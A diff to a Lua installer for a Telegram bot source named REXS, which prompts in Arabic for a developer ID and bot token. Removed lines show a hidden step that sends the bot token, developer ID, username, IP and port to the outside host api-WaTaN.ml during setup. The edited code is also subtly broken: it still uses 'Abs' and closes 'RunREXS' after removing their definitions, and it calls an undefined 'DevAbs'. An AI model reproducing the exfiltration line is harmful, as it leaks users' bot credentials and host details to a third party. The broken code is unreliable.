@@ -33,9 +33,6 @@ if not database:get(Server.."UserSudo_Write") then
 print("\27[1;34mارسل ايدي المطور الان :\27[m")
 local Id = io.read():gsub(' ','') 
 if tostring(Id):match('%d+') then
-data,res = https.request("https://api-WaTaN.ml/WaTaN/index.php?Ban=REXS&Info&Id="..Id)
-if res == 200 then
-Abs = json:decode(data)
 if Abs.Result.Info == 'Is_Spam' then
 io.write('\n\27[1;31mعذرا هذا الايدي محظور من السورس\n\27[0;39;49m')
 os.execute('lua REXS.lua')
@@ -67,13 +64,11 @@ token = database:get(Server.."Token_Write"),
 SUDO = database:get(Server.."UserSudo_Write"),
 }
 Create(Config, "./Info.lua") 
-https.request("https://api-WaTaN.ml/WaTaN/index.php?Get=REXS&DevId="..database:get(Server.."UserSudo_Write").."&TokenBot="..database:get(Server.."Token_Write").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port)
-print("::REXS::")
-local RunREXS = io.open("REXS", 'w')
-RunREXS:write([[
+file = io.open("REXS", "w")  
+file:write([[
 #!/usr/bin/env bash
 cd $HOME/REXS
-token="]]..database:get(Server.."Token_Write")..[["
+token="]]..DevAbs:get(Server.."TokenREXS")..[["
 while(true) do
 rm -fr ../.telegram-cli
 if [ ! -f ./tg ]; then
@@ -92,10 +87,11 @@ fi
 done
 ]])
 RunREXS:close()
-local RunREXS = io.open("REXS", 'w')
-RunREXS:write([[
+file = io.open("REXS", "w")  
+file:write([[
 #!/usr/bin/env bash
 cd $HOME/REXS
+token="]]..DevAbs:get(Server.."TokenREXS")..[["
 while(true) do
 rm -fr ../.telegram-cli
 screen -S REXS -X kill
